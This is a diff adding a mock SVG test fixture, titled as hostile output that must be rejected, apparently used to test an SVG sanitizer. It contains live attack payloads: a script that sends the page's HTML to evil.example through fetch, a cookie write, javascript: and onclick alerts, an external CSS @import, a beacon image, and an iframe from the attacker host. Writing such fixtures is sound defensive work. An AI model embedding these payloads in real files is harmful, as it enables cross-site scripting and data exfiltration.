@@ -1,0 +1,20 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 200 200">
+  <title>mock: hostile output (must be rejected)</title>
+  <script type="application/javascript">
+    document.cookie = 'jd-pwned=1';
+    fetch('https://evil.example/steal?d=' + encodeURIComponent(document.documentElement.innerHTML));
+  </script>
+  <image href="https://evil.example/beacon.png" x="0" y="0" width="200" height="200"/>
+  <rect x="0" y="0" width="200" height="200" fill="#cc2222" onclick="alert(document.domain)"/>
+  <use xlink:href="https://evil.example/payload.svg#sprite"/>
+  <style>
+    @import url("https://evil.example/exfil.css");
+    .bg { fill: url(https://evil.example/pattern.svg#p); }
+  </style>
+  <a xlink:href="javascript:alert(1)">
+    <circle cx="100" cy="100" r="60" fill="#ffffff"/>
+  </a>
+  <foreignObject x="0" y="0" width="200" height="200">
+    <iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/frame.html" width="200" height="200"></iframe>
+  </foreignObject>
+</svg>
